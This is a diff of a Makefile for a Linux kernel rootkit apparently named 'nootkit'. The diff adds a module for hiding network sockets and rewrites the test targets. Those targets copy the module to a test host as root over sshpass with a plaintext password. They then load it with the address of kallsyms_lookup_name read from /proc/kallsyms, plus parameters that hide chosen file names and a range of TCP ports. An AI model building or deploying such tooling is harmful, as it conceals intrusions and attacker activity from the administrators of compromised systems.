@@ -1,6 +1,7 @@
 KDIR := ${PWD}/kernel-headers/linux-headers-5.15.0-76-generic
 obj-m := nootkit.o
-nootkit-y := src/nootkit_main.o src/ksyms.o src/hide/readdir.o
+nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
+nootkit-y += src/hide/readdir.o src/hide/proc_net.o
 nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o
 
 ccflags-y := -I$(src)/src
@@ -15,19 +16,29 @@ build:
 clean:
 	make -C ${KDIR} M=${PWD} clean
 
-test-unload:
+test-remove:
 	-sshpass -pa ssh root@${TEST_IP} "rmmod nootkit"
-
-test-load: build test-unload
 	-sshpass -pa ssh root@${TEST_IP} "rm /nootkit.ko"
+
+test-upload: build
 	sshpass -pa scp nootkit.ko root@${TEST_IP}:/
+
+test-hide-socket: test-remove test-upload
 	sshpass -pa ssh root@${TEST_IP} \
-	'insmod /nootkit.ko \
+	insmod /nootkit.ko \
+	' \
 	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
-	hide_filenames=hello,q \
-	hide_inodes=138210,17635'
+	"hide_sockets=\" \
+	PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; 	\
+	\"" \
+	'
 
-test-hello: test-load
-	sshpass -pa ssh root@${TEST_IP} "journalctl -kS -10sec"
+test-hide-filename: test-remove test-upload
+	sshpass -pa ssh root@${TEST_IP} \
+	insmod /nootkit.ko \
+	' \
+	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
+	hide_filenames=hello \
+	'
 
-test: test-hello test-unload
+# test: test-hide-filename test-hide-socket
